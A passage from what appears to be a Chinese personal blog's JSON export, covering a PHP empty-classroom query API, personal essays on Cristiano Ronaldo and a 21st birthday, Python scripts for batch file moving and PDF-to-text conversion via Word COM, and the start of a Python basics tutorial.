$result-&gt;fetch_assoc()) &#123; printf(&quot;%s\\n&quot;, $row[&#x27;classroom&#x27;]); //var_dump($row); &#125; $conn-&gt;close(); //关闭数据库连接?&gt; 接口 method: post week: 星期 int 1 ~ 7 building : 教学楼名称 str 公共教学一楼 公共教学二楼 公共教学三楼 公共教学四楼 明德主楼 明德商学楼 明德国际楼 明德法学楼 明德新闻楼 求是楼 startTime: 起始节数 int 1~15 endTime: 终止节数 int 1~15 返回： 每一行为即为一个空教室 样例（url请自行修改） Python 123456789101112131415161718# -*-coding:utf-8 -*-&#x27;&#x27;&#x27;author: hrwhipserdate : May 16, 2015&#x27;&#x27;&#x27;import requestsurl = &#x27;http://localhost/phpService.php&#x27;data =&#123; &#x27;week&#x27;: &#x27;3&#x27;, &#x27;building&#x27;:&#x27;公共教学二楼&#x27;, &#x27;startTime&#x27;:1, &#x27;endTime&#x27;:15,&#125;r = requests.post(url,data=data)print r.text 输出： 1234567822052313231923202407241524172418 PHP 12345678910111213141516&lt;?php header(&quot;Content-type: text/html; charset=utf-8&quot;); $url = &quot;http://localhost/phpService.php&quot;; $post_data = array (&quot;building&quot; =&gt; &quot;公共教学二楼&quot;, &quot;week&quot; =&gt; &quot;2&quot;, &quot;startTime&quot;=&gt;&quot;1&quot;, &quot;endTime&quot;=&gt;&quot;10&quot;); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data); $output = curl_exec($ch); curl_close($ch); print_r($output);?&gt;","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"OtherCodes","slug":"code/OtherCodes","permalink":"https://www.hrwhisper.me/categories/code/OtherCodes/"}],"tags":[{"name":"php","slug":"php","permalink":"https://www.hrwhisper.me/tags/php/"}]},{"title":"向你致敬，克里斯蒂亚诺·罗纳尔多","slug":"respect-for-you-cristiano-ronaldo","date":"2015-05-15T07:24:31.000Z","updated":"2020-10-19T14:35:48.825Z","comments":true,"path":"respect-for-you-cristiano-ronaldo/","link":"","permalink":"https://www.hrwhisper.me/respect-for-you-cristiano-ronaldo/","excerpt":"我总是欣赏努力的人， 因为我也同样的努力。","text":"我总是欣赏努力的人， 因为我也同样的努力。 [player autoplay=\"1\"] 欧冠。 清晨醒来，打开手机，看看赛事结果。 看到皇马输给了尤文，心里暗暗高兴。 什么，C罗又点球进了？进的那么多点球，凭啥和我梅西争？ 然而之后， 看到了C罗怒砸门柱仰天长叹，那种失望的神情。 我突然觉得心软了。 也许这场比赛过后，双骄时代结束了。 突然很心疼C罗。 Cristiano Ronaldo1 我也曾一度的觉得，哪来的绝代双骄，这是梅西一个人的时代。 在球场上，白衣飘飘的CR7对红蓝10号说，我一定会超过你。 而红蓝10号只会笑着说，来吧。 无论是在伯纳乌还是在诺坎普。 而C罗确实也足够的努力，渐渐的，他把金球从1:4变成3:4…… 我开始反思， 也许当我们过于喜欢或者崇拜一样人和事的时候，自己的眼光变得狭隘而盲目，总会觉得自己喜欢的，便是最好的，失去认可别人的能力，甚至对其他的东西不加自主的加以诋毁，来凸显自己喜欢的高贵——就像那出淤泥而不染傲然独立的莲。 舍友jy买了mac 买了ipad。他说，越来越觉得windows不好用，注册表臃肿云云。而我始终说，买了ipad还不如买surface。 其实都不过是对自己使用的产品，或者是欣赏的产品加以修饰，至少，买了不要后悔。 是的，至少我是这样的，虽然我没买surface。 所以当C罗分手后，我也只是幸灾乐祸的一笑。我也随着大众跟着质疑他，通过假摔来骗取点球，这样真的好么？就连他进球后庆祝动作也在嘲笑。 我讨厌纹身，就像一个再怎么漂亮的女孩纸，涂了色彩鲜艳的指甲油，我只觉得恶心与反胃。 而我却对梅西那样的包容，即使我觉得梅西是不是不再是那个单纯的少年，却也接受了他手臂上已刻上新的纹身那样既定的事实。 而C罗呢，他为了捐血，从不纹身。 在同一个球门前，C罗领悟到了命运的安排。1比0领先时，他曾创造出一个绝佳机会，晃倒尤文后卫，却没有选择自己射门，而是把球传向了门前，当队友的再次横传被破坏后，C罗懊恼的用手击打门柱，随后仰天长叹……输掉半决赛，C罗清楚，他可能已经永远错失了追赶梅西的机会，年初他信誓旦旦的说，要力争金球奖总数追平阿根廷人，但到了年底时，3比4很可能变成3比5，而他那时已经31岁了。 C罗继承了足球上一个伟大的姓氏，注定了他是不平凡的， 然而他是那么的努力，却始终超越不了梅西， 因为梅西是那个注定站在这个时代顶端的人。 但他们终究将会败给那个叫做时间的东西。 就像曾经那些陪伴一些人青春岁月的NBA球星们，那个科比，那个称为麦迪的时刻。 就像西班牙的黄金一代，也在去年世界杯上黯然神伤。 只是，当我们的年轮多了一圈又一圈， 会不会还有人记得，那永远在梅球王后面追赶他的那个小小罗？ C罗，累了的话，就回到那个回到曼彻斯特，那个梦开始的地方吧。 即使我希望他仍然能和梅西再战几年。 我仍然记得13年看到他说的，you'd better bring, cause I'll bring every I've got it.（你最好全神贯注，因为我定会全力以赴！）仍然这么的让人热血沸腾。 而我总是欣赏努力的人，因为我也同样的努力。 而我却不知道这艘船，将要驶向何方。 会是徒劳吗？心中总有那么个锥心的问号。 但是尽吾志而不能至者，可以无悔矣。 我向你致敬，克里斯蒂亚诺·罗纳尔多。","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"谁的呢喃","slug":"whisper/谁的呢喃","permalink":"https://www.hrwhisper.me/categories/whisper/%E8%B0%81%E7%9A%84%E5%91%A2%E5%96%83/"}],"tags":[{"name":"足球","slug":"足球","permalink":"https://www.hrwhisper.me/tags/%E8%B6%B3%E7%90%83/"}]},{"title":"这一天我二十又一","slug":"today-i-am-twenty-one","date":"2015-05-10T05:07:21.000Z","updated":"2020-10-22T14:52:18.016Z","comments":true,"path":"today-i-am-twenty-one/","link":"","permalink":"https://www.hrwhisper.me/today-i-am-twenty-one/","excerpt":"前言 今天的我二十又一。 而今天的我还是一无所有。 没有事业，没有女票，还在让父母养活…… 还是习惯在博客上写点心情，写点故事。 还是习惯在自己一个人去图书馆呆着……","text":"前言 今天的我二十又一。 而今天的我还是一无所有。 没有事业，没有女票，还在让父母养活…… 还是习惯在博客上写点心情，写点故事。 还是习惯在自己一个人去图书馆呆着…… BGM: 不管前方的路有多苦，只要走的方向正确，不管多么崎岖不平，都比站在原地更接近幸福。——《千与千寻》 [player autoplay=\"1\"] 昨天，世雄说，刚才我在写代码，然后突然你之前要去开会都回来叫我一起。 而我呢，我已经很久没开过会了，也没人叫我去开会了。。。 瞬间感觉挺惆怅，时光真的似水。 谁不曾是个爱做梦的少年？ 曾也有诗一般的信仰，看过《北戴河海滨的幻想》便对其心神驰往，欲要投入无垠的怀抱。 写过诗，伤春悲秋，唯独没有送给过人。 也曾做过英雄的梦，一己之力力挽狂澜，拯救苍天，拯救大地。 而我们总该回归点现实，没有钢铁侠的盔甲，没有复仇者联盟里复仇者们的能力。 我妈妈说，你出生的那一个月，经常下雨。 五月的帝都，终于也开始淅淅沥沥的下起雨来。 而今天，我二十又一，而今天，我还是一无所有。 雨，生于天，死于地。 我们羡慕毛毛细雨细雨的轻盈、倾盆大雨的洒脱， 可却未曾见过雨水的一生，是笔直的落下， 它却总是因风、因云、因自身之重，随时的调整自己下落的位置。 而人，也一样，总有太多的无奈。 你可曾看出过这雨水的不甘? 而我总也是同样的不甘。 最近阿里巴巴面试被刷，好像离梦想又远了一点。 你喜欢的人不是不是也喜欢着你，又是一个难以解开的结。 也许生活真的就是一个婊子，一个戏子，在你就如锅中的青蛙要往外跳时，猛然把锅盖住。 去年的时候看《同桌的你》，最后他们说是输给了现实。 现实这个东西，真是怯弱者一个很好的借口。 而我不会因为曾经受过了伤就改变了自己。 我仍然可以为自己喜欢的人千千万万遍。就像《追风筝的人》里的哈桑。 我仍然可以义无反顾，就像现在巴塞罗那的苏亚雷斯，曾步行20公里去看他的她。 仍然有年少轻狂的勇气，即使相隔两地，不远万里，仍然会一样的爱着。 仍然会相信爱情这种东西，要么从不开始，要么就一辈子。 还是会对自己喜欢的人毫不掩饰自己的喜欢。但我不会说，除非我确定你也喜欢我。因为我只能爱喜欢我的人。 还是依旧对喜欢的人/事物 热衷，对不喜欢的东西不屑于顾， 我仍然喜欢黄伟文《苦瓜》的韵味，这个半生瓜，也许你年轻不会明白它的好，你可以当我是苦瓜，加几声嘘声也不怕。 我仍然会脚踏实地，跟随自己的内心。 不要以年少为借口，那不是犯错误的理由，多读书，摄取点经验，思维的高度确实很大程度上决定了你当前的所作所为。 培养一些兴趣爱好，让这些贯穿你的一生，而不是成为一个百无聊赖的人。 今天我二十又一， 没有事业，但我才刚刚开始，少于别人十年的努力，却想有别人十年后的成就，这不是妄想，这是犯罪。 没有女票，但貌似遇到一个自己挺喜欢的人,如果可以，想给她一个海风习习潮来汐往的未来。 还在让父母养活，所以懂得节俭。并非买不起Ipad等等，而是不想花那个钱。（话说手机还是拿国奖8000大洋去买的。。） 今天我二十又一，虽然还是一无所有。 在博客上写着心情，也许有一天有人会全部看完，说，我看过你全部的文字，所以我知道我爱你。 去图书馆积蓄力量，为未来另一半努力着，你得养活一家。 也许我有很多的缺点，但这并不妨碍我成为更好的人。 我二十一年前曾我以一挑亿，跑赢了其他所有的精子，那么我必然生来就是牛逼的。 今天我二十又一，天下起雨，有点凉，有点迷茫，有点恍惚。 我仍看不清未来，如同脱下眼镜后，远处的灯光被模糊成一个个的光斑，如同摄影里的虚焦。 但我看的清自己。 我感谢过去的我的种种努力， 我仍然相信努力的人本身就有奇迹。 我所理解的生活仍然是和自己喜欢的一切在一起， 而快乐，则是我们共同的信仰。 祝自己生日快乐，也祝麻麻母亲节快乐。 后记 昨天洋洋洒洒的写了近一千字，今天都删掉重写了。 舍友jy说不要那么多的引用，我加入了太多的解释与说明，文章应该是反映自己的内心，而非别人的看法。 于是又回炉再造。 仅以此文，纪念一下又老了一岁的日子。 以及，21岁的心情、看法。 也许会被将来的我嘲笑，但年轻真好。 嗯，不过生日。 码代码吧。 附录 一、雨季不再来（2014.4月写在csdn上） 四月最残忍，从死了的，土地滋生丁香，混杂着，回忆和欲望，让春雨，挑动着呆钝的根。——艾略特《荒原》 《雨季不再来》早就看完了，只不过迟迟没写书评。我向来不太喜欢写书评，就是不太喜欢揣测着作者的意图。 前些天，印象很深的一场雨，夹杂着电闪雷鸣，顺便带上小弟冰雹，只是过早的燃尽了热情，远不如细水长流。 而今，又是一个雨天。 风，不大，轻轻一阵边转化为淅沥的雨声，转化为河中更密的涟漪，转化为路上更稠的泥泞。 你，走向窗前，把冰凉的玻璃窗呵出一片迷雾，用手划去，试图拨开那帘子般的雨，看一眼帘外晴空。而这毕竟是不切实的想法，你看到的，只是窗外无数晶莹的雨滴。叹了口气，玻璃窗渐渐模糊，仍用手去划，就这样划着划着，终于划出了你思念中人的名字。 等待雨，是伞的宿命。 而我等的人，又会在多远的未来。 不喜欢打伞，小雨的时候，乐于在雨中舞蹈，寻找生命的那一抹郁郁青青，看花红柳绿，水珠晶莹。 斜风细雨不须归。 然而，也曾盼望过雨，也曾诅咒过雨。 遇到连月不开的阴雨，同样在窗前，看雨，落得异常无聊。 可，滂沱大雨总会停，不是么？ 不，这世界上从来就没有滂沱大雨，向来都是自己心底的雨，淋湿了自己。 意识到这点，把忧愁烦恼重重的丢在桌上，惊起一片尘埃。 而后，不，没有后来，只有曾经与现在。 是啊，生命里不会再有那么一个雨季，雨后蚯蚓钻出水沟，好奇的看着它们爬行; 不会再有那么一个雨季，围观着那忙碌得不可开交得蚂蚁搬家; 不会再有那么一个雨季，在水洼中用力一踏溅起水花，不在乎弄脏鞋子; 不会再有那么一个雨季，一把伞下的两个音符，相视默契一笑; 不会再有那么一个雨季，你微笑嘴角上扬，纤纤细手指点如墨江山； 不会再有那么一个雨季，彳亍在一个悠长而又寂寥的小巷，等一个丁香般姑娘的惊鸿一瞥； 不会再有那么一个雨季，祈求着花未谢，雨未消，你未离去； 不会再有那么一个雨季，在窗前看着雨，等待着雨后美丽的彩虹; 不会再有那么一个雨季，在雨中玩耍，贪玩得不想回家。 是啊，雨生于天，死于地，雨滴落了，滴落了，雨季不再来。 心，愈发的沉稳起来，心跳，如水滴穿石。 面对偶尔心烦的事，略略皱了皱眉，而又笑颜如花。 我说你是人间的四月天， 笑响点亮了四面风。 二、徐志摩《北戴河海滨的幻想》 他们都到海边去了。我为左眼发炎不曾去。我独坐在前廊，偎坐在一张安适的大椅内，袒着胸怀，赤着脚，一头的散发，不时有风来撩拂。清晨的晴爽，不曾消醒我初起时睡态；但梦思却半被晓风吹断。我阖紧眼帘内视，只见一斑斑消残的颜色，一似晚霞的余赭，留恋地胶附在天边。廊前的马樱、紫荆、藤萝、青翠的叶与鲜红的花，都将他们的妙影映印在水汀上，幻出幽媚的情态无数；我的臂上与胸前，亦满缀了绿荫的斜纹。从树荫的间隙平望，正见海湾：海波亦似被晨曦唤醒，黄蓝相间的波光，在欣然的舞蹈。滩边不时见白涛涌起，迸射着雪样的水花。浴线内点点的小舟与浴客，水禽似的浮着；幼童的欢叫，与水波拍岸声，与潜涛呜咽声，相间的起伏，竞报一滩的生趣与乐意。但我独坐的廊前，却只是静静的，静静的无甚声响。妩媚的马樱，只是幽幽的微辗着，蝇虫也敛翅不飞。只有远近树里的秋蝉，在纺妙似的垂引他们不尽的长吟。 在这不尽的长吟中，我独坐在冥想。难得是寂寞的环境，难得是静定的意境；寂寞中有不可言传的和谐，静默中有无限的创造。我的心灵，比如海滨，生平初度的怒潮，已经渐次的消翳，只剩有疏松的海砂中偶尔的回响，更有残缺的贝壳，反映星月的辉芒。此时摸索潮余的斑痕，追想当时汹涌的情景，是梦或是真，再亦不须辨问，只此眉梢的轻皱，唇边的微哂，已足解释无穷奥绪，深深的蕴伏在灵魂的微纤之中。 青年永远趋向反叛，爱好冒险；永远如初度航海者，幻想黄金机缘于浩渺的烟波之外：想割断系岸的缆绳，扯起风帆，欣欣的投入无垠的怀抱。他厌恶的是平安，自喜的是放纵与豪迈。无颜色的生涯，是他目中的荆棘；绝海与凶献，是他爱取自由的途径。他爱折玫瑰；为她的色香，亦为她冷酷的刺毒。他爱搏狂澜：为他的庄严与伟大，亦为他吞噬一切的天才，最是激发他探险与好奇的动机。他崇拜冲动：不可测，不可节，不可预逆，起，动，消歇皆在无形中，狂飚似的倏忽与猛烈与神秘。他崇拜斗争：从斗争中求剧烈的生命之意义，从斗争中求绝对的实在，在血染的战阵中，呼叫胜利之狂欢或歌败丧的哀曲。 幻象消灭是人生里命定的悲剧；青年的幻灭，更是悲剧中的悲剧，夜一般的沉黑，死一般的凶恶。纯粹的，猖狂的热情之火，不同阿拉伯的神灯，只能放射一时的异彩，不能永久的朗照；转瞬间，或许，便已敛熄了最后的焰舌，只留存有限的余烬与残灰，在未灭的余温里自伤与自慰。 流水之光，星之光，露珠之光，电之光，在青年的妙目中闪耀，我们不能不惊讶造化者艺术之神奇，然可怖的黑影，倦与衰与饱餍的黑影，同时亦紧紧的跟着时日进行，仿佛是烦恼、痛苦、失败，或庸俗的尾曳，亦在转瞬间，彗星似的扫灭了我们最自傲的神辉——流水涸，明星没，露珠散灭，电闪不再！ 在这艳丽的日辉中，只见愉悦与欢舞与生趣，希望，闪烁的希望，在荡漾，在无穷的碧空中，在绿叶的光泽里，在虫鸟的歌吟中，在青草的摇曳中——夏之荣华，春之成功。春光与希望，是长驻的；自然与人生，是调谐的。 在远处有福的山谷内，莲馨花在坡前微笑，稚羊在乱石间跳跃，牧童们，有的吹着芦笛，有的平卧在草地上，仰看交幻的浮游的白云，放射下的青影在初黄的稻田中缥缈地移过。在远处安乐的村中，有妙龄的村姑，在流涧边照映她自制的春裙；口衔烟斗的农夫三四，在预度秋收的丰盈，老妇人们坐在家门外阳光中取暖，她们的周围有不少的儿童，手擎着黄白的钱花在环舞与欢呼。 在远——远处的人间，有无限的平安与快乐，无限的春光…… 在此暂时可以忘却无数的落蕊与残红；亦可以忘却花荫中掉下的枯叶，私语地预告三秋的情意；亦可以忘却苦恼的僵瘪的人间，阳光与雨露的殷勤，不能再恢复他们腮颊上生命的微笑，亦可以忘却纷争的互杀的人间，阳光与雨露的仁慈，不能感化他们凶恶的兽性；亦可以忘却庸俗的卑琐的人间，行云与朝露的丰姿，不能引逗他们刹那间的凝视；亦可以忘却自觉的失望的人间，绚烂的春时与媚草，只能反激他们悲伤的意绪。 我亦可以暂时忘却我自身的种种；忘却我童年期清风白水似的天真；忘却我少年期种种虚荣的希翼；忘却我渐次的生命的觉悟；忘却我热烈的理想的寻求；忘却我心灵中乐观与悲观的斗争；忘却我攀登文艺高峰的艰辛；忘却刹那的启示与彻悟之神奇；忘却我生命潮流之骤转；忘却我陷落在危险的旋涡中之幸与不幸；忘却我追忆不完全的梦境；忘却我大海底里埋首的秘密；忘却曾经刳割我灵魂的利刃，炮烙我灵魂的烈焰，摧毁我灵魂的狂飚与暴雨；忘却我的深刻的怨与艾；忘却我的冀与愿；忘却我的恩泽与惠感；忘却我的过去与现在…… 过去的实在，渐渐的膨胀，渐渐的模糊，渐渐的不可辨认；现在的实在，渐渐的收缩，逼成了意识的一线，细极狭极的一线，又裂成了无数不相联续的黑点……黑点亦渐次的隐翳？幻术似的灭了，灭了，一个可怕的黑暗的空虚……","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"谁的呢喃","slug":"whisper/谁的呢喃","permalink":"https://www.hrwhisper.me/categories/whisper/%E8%B0%81%E7%9A%84%E5%91%A2%E5%96%83/"}],"tags":[{"name":"生活","slug":"生活","permalink":"https://www.hrwhisper.me/tags/%E7%94%9F%E6%B4%BB/"},{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"python 文件 操作","slug":"python-file-operation","date":"2015-05-09T11:26:11.000Z","updated":"2021-01-08T13:42:14.079Z","comments":true,"path":"python-file-operation/","link":"","permalink":"https://www.hrwhisper.me/python-file-operation/","excerpt":"最近在做人工智能的时候，面对几万个PPT，想要拆分成几个组，每组100个。 于是学了学python文件操作，轻松解决。","text":"最近在做人工智能的时候，面对几万个PPT，想要拆分成几个组，每组100个。 于是学了学python文件操作，轻松解决。 Code 首先获取该目录下的所有文件名，然后根据个数判断当前文件应该属于哪一个文件夹。 如果文件夹不存在，那么创建之，最后拷贝过去即可。 1234567891011121314151617181920212223# -*-coding:utf-8 -*-&#x27;&#x27;&#x27;author: hrwhipserdate : May 13, 2015&#x27;&#x27;&#x27;from win32com import client as wc import osimport shutil pdfPath = r&#x27;J:\\realpdf\\allpaper&#x27;files = os.walk(pdfPath).next()[2] cnt = 0for i,file in enumerate(files): print i,file newfilePath = pdfPath+&#x27;\\\\&#x27;+str(cnt) if i / 100 &gt; cnt : cnt += 1 newfilePath = pdfPath+&#x27;\\\\&#x27;+str(cnt) if not os.path.exists(newfilePath): os.mkdir(newfilePath) shutil.move(pdfPath+&#x27;\\\\&#x27;+file,newfilePath+&#x27;\\\\&#x27;+file)print &#x27;ok&#x27; 附录 python中对文件、文件夹（文件操作函数）的操作需要涉及到os模块和shutil模块。 方法 功能 os.getcwd() 得到当前工作目录,即当前Python脚本工作的目录路径 os.listdir() 返回指定目录下的所有文件和目录名 os.remove() 函数用来删除一个文件 os.removedirs(r”c”) 删除多个目录 os.path.isfile() 检验给出的路径是否是一个文件 os.path.isdir() 检验给出的路径是否是一个目录 os.path.isabs() 判断是否是绝对路径 os.path.exists() 检验给出的路径是否存在 os.path.split() 返回一个路径的目录名和文件名 os.path.splitext() 分离扩展名 os.path.dirname() 获取路径名 os.path.basename() 获取文件名 os.system() 运行shell命令 os.getenv() 与os.putenv() 读取和设置环境变量 os.linesep 给出当前平台使用的行终止符 os.name 指示你正在使用的平台(对于Windows:nt , Linux/Unix: posix) os.rename(old, new) 重命名 os.makedirs(r”c”) 创建多级目录 os.mkdir(“test”) 创建单个目录 os.stat(file) 获取文件属性 os.mknod(“test.txt”) 创建空文件 shutil.copyfile(“oldfile”,”newfile”) 复制文件 shutil.copy(“oldfile”,”newfile”) 复制文件2 oldfile只能是文件夹,newfile可以是文件,也可以是目标目录 shutil.copytree(“olddir”,”newdir”) 复制文件夹olddir和newdir都只能是目录,且newdir必须不存在 os.rename(“oldname”,“newname”) 重命名文件(或目录) shutil.move(“oldpos” , “newpos”) 移动文件(目录) os.remove(“file”) 删除文件 os.rmdir(“dir”) 删除空目录 shutil.rmtree(“dir”) 删除目录（不管空不空） os.chdir(“path”) 转换目录 fp = open(“test.txt”,w) 直接打开一个文件，如果文件不存在则创建文件 关于open 模式： w 以写方式打开， a 以追加模式打开 (从 EOF 开始, 必要时创建新文件) r+ 以读写模式打开 w+ 以读写模式打开 (参见 w ) a+ 以读写模式打开 (参见 a ) rb 以二进制读模式打开 wb 以二进制写模式打开 (参见 w ) ab 以二进制追加模式打开 (参见 a ) rb+ 以二进制读写模式打开 (参见 r+ ) wb+ 以二进制读写模式打开 (参见 w+ ) ab+ 以二进制读写模式打开 (参见 a+ ) fp.read([size]) size为读取的长度，以byte为单位 fp.readline([size]) 读一行，如果定义了size，有可能返回的只是一行的一部分 fp.readlines([size]) 把文件每一行作为一个list的一个成员，并返回这个list。其实它的内部是通过循环调用readline()来实现的。如果提供size参数，size是表示读取内容的总长，也就是说可能只读到文件的一部分。 fp.write(str) 把str写到文件中，write()并不会在str后加上一个换行符 fp.writelines(seq) 把seq的内容全部写到文件中(多行一次性写入)。这个函数也只是忠实地写入，不会在每行后面加上任何东西。 fp.close() 关闭文件。python会在一个文件不用后自动关闭文件，不过这一功能没有保证，最好还是养成自己关闭的习惯。 如果一个文件在关闭后还对其进行操作会产生ValueError fp.flush() 把缓冲区的内容写入硬盘 fp.fileno() 返回一个长整型的”文件标签“ fp.isatty() 文件是否是一个终端设备文件（unix系统中的） fp.tell() 返回文件操作标记的当前位置，以文件的开头为原点 fp.next() 返回下一行，并将文件操作标记位移到下一行。把一个file用于for … in file这样的语句时，就是调用next()函数来实现遍历的。 fp.seek(offset[,whence]) 将文件打操作标记移到offset的位置。这个offset一般是相对于文件的开头来计算的，一般为正数。但如果提供了whence参数就不一定了，whence可以为0表示从头开始计算，1表示以当前位置为原点计算。2表示以文件末尾为原点进行计算。需要注意，如果文件以a或a+的模式打开，每次进行写操作时，文件操作标记会自动返回到文件末尾。 fp.truncate([size]) 把文件裁成规定的大小，默认的是裁到当前文件操作标记的位置。如果size比文件的大小还要大，依据系统的不同可能是不改变文件，也可能是用0把文件补到相应的大小，也可能是以一些随机的内容加上去。","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"python learning","slug":"study/python-learning","permalink":"https://www.hrwhisper.me/categories/study/python-learning/"}],"tags":[{"name":"Cool","slug":"Cool","permalink":"https://www.hrwhisper.me/tags/Cool/"},{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"}]},{"title":"pdf to txt  ( win32com 编程 )","slug":"pdf-to-txt-win32com-programing","date":"2015-05-02T13:43:50.000Z","updated":"2020-10-21T14:32:09.008Z","comments":true,"path":"pdf-to-txt-win32com-programing/","link":"","permalink":"https://www.hrwhisper.me/pdf-to-txt-win32com-programing/","excerpt":"最近需要将 pdf 批量转为 txt ，用软件效果挺差，想起 word 2013 可以打开pdf ，试了下，效果挺不错的。 然后 word 可以保存 txt 。 问题是如何做呢？ word 自带 com编程，直接用python 调用 windows api","text":"最近需要将 pdf 批量转为 txt ，用软件效果挺差，想起 word 2013 可以打开pdf ，试了下，效果挺不错的。 然后 word 可以保存 txt 。 问题是如何做呢？ word 自带 com编程，直接用python 调用 windows api 最好用SaveAs2,这是2010 和2013的API。之前版本的是SaveAs。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445# -*- coding: utf-8 -*-# author: hrwhisper# blog: hrwhisper.mefrom win32com import client as wc import osclass PdfTotxt: def __init__(self,pdfPath,savePath): self.pdfPath = pdfPath self.savePath = savePath self.word = wc.Dispatch(&#x27;Word.Application&#x27;) # 后台运行，不显示，不警告 self.word.Visible = 0 self.word.DisplayAlerts = 0 def startChange(self): for path, subdirs, files in os.walk(self.pdfPath ): for pdfFile in files: pdfFullName = os.path.join(path, pdfFile) dotIndex = pdfFile.rfind(&quot;.&quot;) fileSuffix = pdfFile[(dotIndex + 1) : ] if fileSuffix == &quot;pdf&quot; : try: doc = self.word.Documents.Open(pdfFullName) #至少两百字 if doc.Words.count &lt; 200: doc.Close() continue fileName = pdfFile[ : dotIndex] +&quot;.txt&quot; fileName = os.path.join(self.savePath, fileName) print path+ &#x27;\\\\&#x27; + pdfFile+&quot; ====&gt; &quot; + fileName #, SaveAs method is used in versions before Word 2007. If you use Office 2010, I suggest you try Document.SaveAs2 Method. #https://social.msdn.microsoft.com/Forums/en-US/a4f00910-cb6e-4861-bf96-97b0cfc6cf8f/convert-word-files-from-doc-to-docx-using-python?forum=worddev doc.SaveAs2(fileName, FileFormat=2) doc.Close() except Exception,e: print &#x27;********************ERROR&#x27;,path+ &#x27;\\\\&#x27; + pdfFile,e self.word.Quit() pdfPath = r&#x27;J:\\realpdf\\test&#x27;savePath = r&#x27;J:\\realpdf\\test\\out&#x27;task = PdfTotxt(pdfPath,savePath) task.startChange()print &#x27;ok&#x27; 附录 其他的文件保存形式 只需要修改SaveAs2的参数FileFormat即可（如我保存为TXT FileFormat=2,如果Html则为10） Name Value Description wdFormatDocument 0 Microsoft Office Word 97 – 2003 binary file format. wdFormatDOSText 4 Microsoft DOS text format. wdFormatDOSTextLineBreaks 5 Microsoft DOS text with line breaks preserved. wdFormatEncodedText 7 Encoded text format. wdFormatFilteredHTML 10 Filtered HTML format. wdFormatFlatXML 19 Open XML file format saved as a single XML file. wdFormatFlatXML 20 Open XML file format with macros enabled saved as a single XML file. wdFormatFlatXMLTemplate 21 Open XML template format saved as a XML single file. wdFormatFlatXMLTemplateMacroEnabled 22 Open XML template format with macros enabled saved as a single XML file. wdFormatOpenDocumentText 23 OpenDocument Text format. wdFormatHTML 8 Standard HTML format. wdFormatRTF 6 Rich text format (RTF). wdFormatStrictOpenXMLDocument 24 Strict Open XML document format. wdFormatTemplate 1 Word template format. wdFormatText 2 Microsoft Windows text format. wdFormatTextLineBreaks 3 Windows text format with line breaks preserved. wdFormatUnicodeText 7 Unicode text format. wdFormatWebArchive 9 Web archive format. wdFormatXML 11 Extensible Markup Language (XML) format. wdFormatDocument97 0 Microsoft Word 97 document format. wdFormatDocumentDefault 16 Word default document file format. For Word 2010, this is the DOCX format. wdFormatPDF 17 PDF format. wdFormatTemplate97 1 Word 97 template format. wdFormatXMLDocument 12 XML document format. wdFormatXMLDocumentMacroEnabled 13 XML document format with macros enabled. wdFormatXMLTemplate 14 XML template format. wdFormatXMLTemplateMacroEnabled 15 XML template format with macros enabled. wdFormatXPS 18 XPS format. 详见https://msdn.microsoft.com/en-us/library/ff839952.aspx","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"python learning","slug":"study/python-learning","permalink":"https://www.hrwhisper.me/categories/study/python-learning/"}],"tags":[{"name":"Cool","slug":"Cool","permalink":"https://www.hrwhisper.me/tags/Cool/"},{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"win32com","slug":"win32com","permalink":"https://www.hrwhisper.me/tags/win32com/"}]},{"title":"python 基本语法 和 python 技巧 整理","slug":"python-grammar-and-some-tricks","date":"2015-04-14T02:55:45.000Z","updated":"2021-01-08T13:42:14.046Z","comments":true,"path":"python-grammar-and-some-tricks/","link":"","permalink":"https://www.hrwhisper.me/python-grammar-and-some-tricks/","excerpt":"python 技巧 的整理","text":"python 技巧 的整理 写在前面 逗比龙和jy 被我洗脑来学python了，还说我是传销。 我这是解救他们于水深火热好么！ 写点 python的基本语法 和 python 技巧 一、模块的安装 主要有easy_install 和pip，用法如下 easy_install XXXX pip install XXXX pip unistall XXXX 推荐用pip,以为它可以卸载模块 二、准备开始 在Linux下直接运行python #!/usr/bin/env python 标明文件编码，主要用于文件中如果有中文字符的话。。 **# -*_-coding:utf-8 -*_-** 单行注释 为#，多行注释可以用三个单引号如：''' XXX ''' 三、python基本语法 （一）输入输出 1.输出： 从Hello word 开始 12print &#39;hello world&#39;print &#39;hello&#39;,&#39;world&#39; ps:print 遇到,自动打印一个空格，上面两句打印效果是一样的 : ) 2.输入： 读入一行数据，并且打印的demo: 12name &#x3D; raw_input()print name （二）一看就会的简单语句 1.条件 需要注意的是if /elif/ else后面均有 : 如果之后的语句只有一句，那么可以写在同一行 1234567if age &gt;&#x3D; 18: print &#39;adult&#39;elif age &gt;&#x3D; 6: print &#39;teenager&#39;else: print &#39;kid&#39; 这么写也可以 : ) 1234age &#x3D; 20if age &gt;&#x3D; 18:print &#39;adult&#39;elif age &gt;&#x3D; 6:print &#39;teenager&#39;else: print &#39;kid&#39; 2.循环 (1) for xx in xxx : 1234names &#x3D; [&#39;Michael&#39;, &#39;Bob&#39;, &#39;Tracy&#39;]for name in names: print name 12for i in range(0 ,10 ): print i (2) while xx : 计算100以内所有奇数之和 1234567sum &#x3D; 0n &#x3D; 99while n &gt; 0: sum &#x3D; sum + n n &#x3D; n - 2print sum 当然这只是个样例。。 【高级篇】其实我们可以一行搞定.....： range(a,b,c) a起始位置， b终止位置（不包括b），c步长 1print sum(range(1,100,2)) （三）基本数据类型 1. list list和C/C++中的数组很像，无非把{}改为[] 12classmates &#x3D; [&#39;Michael&#39;, &#39;Bob&#39;, &#39;Tracy&#39;]print classmates[0] 